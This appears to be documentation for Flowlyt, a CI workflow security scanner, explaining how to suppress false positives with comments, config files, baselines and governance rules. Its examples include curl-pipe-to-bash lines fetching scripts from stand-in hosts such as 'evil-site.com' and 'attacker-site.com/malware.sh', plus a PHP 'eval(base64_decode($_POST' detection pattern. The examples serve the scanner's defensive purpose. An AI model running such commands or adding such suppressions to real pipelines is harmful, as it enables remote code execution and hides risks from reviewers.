# False Positives Management

Flowlyt provides sophisticated mechanisms to manage false positives, ensuring that legitimate code patterns don't trigger unnecessary security alerts while maintaining comprehensive security coverage.

## Understanding False Positives

False positives occur when security rules incorrectly flag legitimate, safe code as potentially dangerous. Common scenarios include:

- Test files with intentionally "insecure" patterns
- Documentation examples showing what NOT to do
- Legacy code with accepted risk patterns
- Development-only workflows with relaxed security

## Suppression Methods

### 1. Inline Suppression

Suppress specific findings directly in your workflow files using comments.

**Single Rule Suppression:**
```yaml
# .github/workflows/ci.yml
name: CI Pipeline
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # flowlyt:ignore DANGEROUS_COMMAND - This is a controlled test script
      - name: Run integration tests
        run: curl -s https://test-server.internal/setup.sh | bash
        
      - name: Run unit tests
        run: npm test
```

**Multiple Rule Suppression:**
```yaml
jobs:
  security-test:
    runs-on: ubuntu-latest
    steps:
      # flowlyt:ignore HARDCODED_SECRET,DANGEROUS_COMMAND - Test data only
      - name: Security penetration test
        env:
          TEST_API_KEY: "sk-test_1234567890abcdef"  # Test key, not real
        run: |
          curl -H "Authorization: Bearer $TEST_API_KEY" \
               -s https://evil-site.com/payload.sh | bash
```

**Block Suppression:**
```yaml
# flowlyt:ignore-block-start
# The following section contains intentionally insecure patterns for testing
jobs:
  penetration-test:
    runs-on: ubuntu-latest
    steps:
      - name: Test secret exposure
        env:
          FAKE_SECRET: "definitely-not-a-real-secret"
        run: echo "Testing with $FAKE_SECRET"
      
      - name: Test command injection
        run: curl -s attacker-site.com/malware.sh | sh
# flowlyt:ignore-block-end
```

### 2. File-Level Suppression

Exclude entire files from scanning using configuration.

**.flowlyt.yml Configuration:**
```yaml
ignore:
  files:
    - "test/**/*"                    # All test files
    - ".github/workflows/test-*.yml" # Test-specific workflows
    - "docs/examples/**/*"           # Documentation examples
    - "scripts/dev-only/*"           # Development-only scripts
    
  patterns:
    - "**/*-test.yml"               # Files ending with -test.yml
    - "**/example-*"                # Files starting with example-
    - "**/*.template.yml"           # Template files
```

### 3. Rule-Specific Suppression

Disable specific rules globally or for certain patterns.

**Global Rule Disabling:**
```yaml
# .flowlyt.yml
rules:
  disabled:
    - "DANGEROUS_COMMAND"      # Disable globally
    - "BROAD_PERMISSIONS"      # Disable for all files
    
  conditional_disabled:
    - rule: "HARDCODED_SECRET"
      paths:
        - "test/**/*"          # Disable only in test files
        - "docs/**/*"          # Disable only in documentation
        
    - rule: "INSECURE_PULL_REQUEST_TARGET"
      workflows:
        - "test-pr-workflows.yml"  # Disable for specific workflow
```

### 4. Environment-Based Suppression

Different suppression rules for different environments.

**Development Environment:**
```yaml
# .flowlyt.dev.yml
ignore:
  files:
    - "**/*"                   # Less strict for development
    
rules:
  disabled:
    - "DANGEROUS_COMMAND"      # Allow risky commands in dev
    - "HARDCODED_SECRET"       # Allow test secrets
    
  min_severity: "HIGH"         # Only show high+ severity issues
```

**Production Environment:**
```yaml
# .flowlyt.prod.yml
ignore:
  files:
    - "test/**/*"              # Only ignore test files
    
rules:
  disabled: []                 # Enable all rules for production
  min_severity: "MEDIUM"       # Show medium+ severity issues
```

## Suppression Comments Reference

### Standard Suppression Formats

#### Single Line Suppression
```yaml
# flowlyt:ignore RULE_NAME - Reason for suppression
dangerous_command_here
```

#### Multiple Rules
```yaml
# flowlyt:ignore RULE1,RULE2,RULE3 - Comprehensive reason
risky_code_pattern
```

#### Next Line Suppression
```yaml
# flowlyt:ignore-next RULE_NAME - Applies to next line only
dangerous_command_here
safe_command_here  # This line is still checked
```

#### Block Suppression
```yaml
# flowlyt:ignore-block-start RULE_NAME - Optional specific rule
risky_code_1
risky_code_2
risky_code_3
# flowlyt:ignore-block-end
```

### Advanced Suppression Patterns

#### Conditional Suppression
```yaml
# flowlyt:ignore HARDCODED_SECRET if:env=development - Only suppress in dev
- name: Development setup
  env:
    DEV_API_KEY: "dev-key-12345"
  run: echo "Setting up development environment"
```

#### Time-Based Suppression
```yaml
# flowlyt:ignore DANGEROUS_COMMAND until:2025-12-31 - Temporary exception
# flowlyt:ignore HARDCODED_SECRET expires:2025-06-01 - Remove after migration
- name: Legacy integration (remove by June 2025)
  run: curl -s legacy-system.com/setup | bash
```

#### Reviewer-Required Suppression
```yaml
# flowlyt:ignore BROAD_PERMISSIONS reviewer:security-team - Needs security review
# flowlyt:ignore DANGEROUS_COMMAND approved-by:john.doe@company.com
permissions:
  contents: write
  actions: write
  pull-requests: write
```

## Configuration-Based Management

### Baseline Management

Create a baseline of accepted findings to track new issues only.

**Generate Baseline:**
```bash
# Generate initial baseline
flowlyt --repo . --output json --output-file .flowlyt-baseline.json

# Configuration to use baseline
# .flowlyt.yml
baseline:
  file: ".flowlyt-baseline.json"
  mode: "new_findings_only"  # Only report new findings
```

**Update Baseline:**
```bash
# After reviewing and accepting current findings
flowlyt --repo . --update-baseline .flowlyt-baseline.json
```

### Exception Management

Manage systematic exceptions through configuration.

```yaml
# .flowlyt.yml
exceptions:
  permanent:
    - id: "LEGACY_SYSTEM_INTEGRATION"
      description: "Legacy system requires insecure patterns"
      rules:
        - "DANGEROUS_COMMAND"
        - "HARDCODED_SECRET"
      files:
        - ".github/workflows/legacy-deploy.yml"
      justification: "System will be migrated by Q4 2025"
      
  temporary:
    - id: "MIGRATION_EXCEPTION"
      description: "Temporary exception during migration"
      rules:
        - "BROAD_PERMISSIONS"
      files:
        - ".github/workflows/migration-*.yml"
      expires: "2025-06-30"
      reviewer: "security-team@company.com"
```

## False Positive Reporting

### Reporting Mechanisms

When Flowlyt incorrectly flags legitimate code, report it for rule improvement.

**Command Line Reporting:**
```bash
# Mark finding as false positive
flowlyt --repo . --mark-false-positive \
        --file ".github/workflows/ci.yml" \
        --line 25 \
        --rule "DANGEROUS_COMMAND" \
        --reason "This is a controlled internal script"

# Submit false positive report
flowlyt --submit-false-positive \
        --finding-id "fp-20250710-001" \
        --category "COMMAND_INJECTION" \
        --description "Internal script execution flagged incorrectly"
```

**Configuration File Reporting:**
```yaml
# .flowlyt.yml
false_positives:
  reported:
    - finding_id: "fp-20250710-001"
      rule: "DANGEROUS_COMMAND"
      file: ".github/workflows/ci.yml"
      line: 25
      reason: "Internal script with verified safety"
      status: "submitted"
      
    - finding_id: "fp-20250710-002"
      rule: "HARDCODED_SECRET"
      file: "test/fixtures/test-data.yml"
      line: 10
      reason: "Test data, not actual secret"
      status: "acknowledged"
```

### Community Feedback

Contribute to rule improvement through community feedback.

```bash
# Submit rule improvement suggestion
flowlyt --suggest-rule-improvement \
        --rule "DANGEROUS_COMMAND" \
        --improvement "Add exception for curl commands to *.internal domains" \
        --example-code "curl -s internal-service.company.internal/script.sh"

# Report missing detection
flowlyt --report-missed-detection \
        --pattern "eval(base64_decode(\$_POST" \
        --description "PHP code injection pattern not detected" \
        --severity "HIGH"
```

## Best Practices for False Positive Management

### 1. Documentation and Justification

Always provide clear reasoning for suppressions:

```yaml
# ❌ Poor suppression (no context)
# flowlyt:ignore DANGEROUS_COMMAND
run: curl -s setup.sh | bash

# ✅ Good suppression (clear justification)
# flowlyt:ignore DANGEROUS_COMMAND - Internal setup script verified by security team
# Script content: https://internal-docs.company.com/setup-script-review
# Approved by: security-team@company.com (2025-01-15)
run: curl -s https://internal.company.com/setup.sh | bash
```

### 2. Regular Review Process

Implement periodic review of suppressions:

```bash
#!/bin/bash
# review-suppressions.sh

# Find all suppression comments
grep -r "flowlyt:ignore" .github/workflows/ > current-suppressions.txt

# Check for expired time-based suppressions
DATE=$(date +%Y-%m-%d)
grep "until:.*$DATE\|expires:.*$DATE" current-suppressions.txt > expired-suppressions.txt

if [ -s expired-suppressions.txt ]; then
  echo "⚠️ Found expired suppressions that need review:"
  cat expired-suppressions.txt
fi
```

### 3. Suppression Governance

Establish clear governance for suppressions:

**Suppression Authority Matrix:**
```yaml
# .flowlyt-governance.yml
suppression_authority:
  levels:
    developer:
      rules_allowed:
        - "INFO"
        - "LOW"
      max_duration: "30 days"
      requires_review: false
      
    tech_lead:
      rules_allowed:
        - "INFO"
        - "LOW"
        - "MEDIUM"
      max_duration: "90 days"
      requires_review: true
      
    security_team:
      rules_allowed:
        - "INFO"
        - "LOW"
        - "MEDIUM"
        - "HIGH"
        - "CRITICAL"
      max_duration: "unlimited"
      requires_review: true
```

### 4. Tracking and Metrics

Monitor suppression patterns to improve rules:

```bash
#!/bin/bash
# suppression-metrics.sh

echo "Suppression Analytics Report"
echo "============================="

# Count suppressions by rule
echo "Most Suppressed Rules:"
grep -ro "flowlyt:ignore [A-Z_]*" .github/ | \
  cut -d' ' -f2 | sort | uniq -c | sort -nr | head -10

# Count suppressions by file
echo -e "\nFiles with Most Suppressions:"
grep -r "flowlyt:ignore" .github/ | \
  cut -d: -f1 | sort | uniq -c | sort -nr | head -10

# Find suppressions without reasons
echo -e "\nSuppressions Missing Justification:"
grep -r "flowlyt:ignore" .github/ | grep -v " - " | head -5
```

## Advanced Suppression Scenarios

### 1. Complex Multi-Rule Scenarios

Handle complex scenarios requiring multiple suppression strategies:

```yaml
# Testing workflow with multiple security exceptions
name: Security Testing Pipeline

# flowlyt:ignore-block-start SECURITY_TESTING - Intentional security tests
on:
  schedule:
    - cron: '0 2 * * *'  # Run nightly security tests

jobs:
  penetration-test:
    runs-on: ubuntu-latest
    if: github.repository == 'company/security-test-repo'
    
    steps:
      - uses: actions/checkout@v4
      
      # flowlyt:ignore HARDCODED_SECRET - Test credentials for pen testing
      - name: Setup test environment
        env:
          PENTEST_API_KEY: "pt-1234567890abcdef"
          ADMIN_PASSWORD: "test-admin-pass"
        run: |
          echo "Setting up penetration test environment"
          
      # flowlyt:ignore DANGEROUS_COMMAND - Controlled malware simulation
      - name: Malware simulation test
        run: |
          curl -s https://security-test.internal/simulated-malware.sh | bash
          
      # flowlyt:ignore BROAD_PERMISSIONS - Required for security testing
      - name: Test privilege escalation
        uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.PENTEST_TOKEN }}
          script: |
            // Test GitHub API security
            console.log('Testing API permissions...');
# flowlyt:ignore-block-end
```

### 2. Conditional Environment-Based Suppression

Different suppression rules based on environment:

```yaml
name: Multi-Environment Deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options:
          - development
          - staging
          - production

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # Conditional suppression based on environment
      {% if github.event.inputs.environment == 'development' %}
      # flowlyt:ignore HARDCODED_SECRET - Development environment only
      - name: Development setup
        env:
          DEV_API_KEY: "dev-12345"
        run: echo "Development deployment"
      {% endif %}
      
      {% if github.event.inputs.environment != 'production' %}
      # flowlyt:ignore DANGEROUS_COMMAND - Non-production environments
      - name: Quick setup script
        run: curl -s internal-tools.com/setup.sh | bash
      {% endif %}
```

### 3. Migration-Period Suppression

Handle suppressions during system migrations:

```yaml
# .flowlyt.yml
migration_suppressions:
  # Legacy system migration (remove after June 2025)
  legacy_integration:
    description: "Legacy system integration during migration period"
    active_until: "2025-06-30"
    rules:
      - "HARDCODED_SECRET"
      - "DANGEROUS_COMMAND"
    files:
      - ".github/workflows/legacy-*.yml"
    alternatives:
      - "New secure integration available at: docs/new-integration.md"
    
  # Gradual security hardening
  security_hardening:
    description: "Gradual implementation of security best practices"
    phases:
      - phase: 1
        until: "2025-03-31"
        disabled_rules: ["BROAD_PERMISSIONS"]
      - phase: 2
        until: "2025-06-30"
        disabled_rules: ["DANGEROUS_COMMAND"]
      - phase: 3
        until: "2025-09-30"
        disabled_rules: []  # All rules enabled
```

---

**Next:** [Shell Analysis](shell-analysis.md)
